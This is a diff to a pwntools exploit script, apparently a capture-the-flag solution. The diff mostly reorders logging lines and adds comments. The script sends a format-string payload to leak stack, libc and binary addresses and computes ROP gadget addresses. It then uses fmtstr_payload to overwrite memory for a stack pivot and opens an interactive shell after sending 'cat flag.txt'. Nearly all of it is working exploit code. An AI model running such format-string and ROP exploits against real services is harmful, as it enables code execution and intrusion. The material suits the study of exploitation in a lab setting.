@@ -30,6 +30,7 @@ def ddebug(b=""):
     pause()
 
 
+# leak rsp_add lib_add elf_add
 delta = 0x7fff50afc8b0 - 0x7fff50afc5c0
 libcdelate = 0x7f57df429d0a - 0x7f57df406000
 elfdelate = 0x56509590e220 - 0x0056509590d000
@@ -38,17 +39,16 @@ payload = "%68$p-%71$p-%70$p"
 io.sendlineafter("to post?\n", payload)
 io.recvuntil("\n")
 rbp_0x200 = int(io.recvuntil("-")[:-1], 16) - delta
-success("rsp -> " + hex(rbp_0x200))
 libc.address = int(io.recvuntil("-")[:-1], 16) - libcdelate
-success("libcaddress -> " + hex(libc.address))
 elf.address = int(io.recvuntil("\n"), 16) - elfdelate
+success("rsp -> " + hex(rbp_0x200))
+success("libcaddress -> " + hex(libc.address))
 success("elfcaddress -> " + hex(elf.address))
 
+# return to ROP
 leave_ret = elf.address + 0x0000000000001217
 ret = elf.address + 0x0000000000001016
 pop_rdi = elf.address + 0x000000000000127b
-
-print(libc.symbols["system"])
 
 rbp = rbp_0x200 + 0x200
 write_dict = {
@@ -62,4 +62,5 @@ payload = fmtstr_payload(6, write_dict, write_size="short")
 
 io.sendlineafter("like to post?", payload)
 
+io.sendline("cat flag.txt")
 io.interactive()
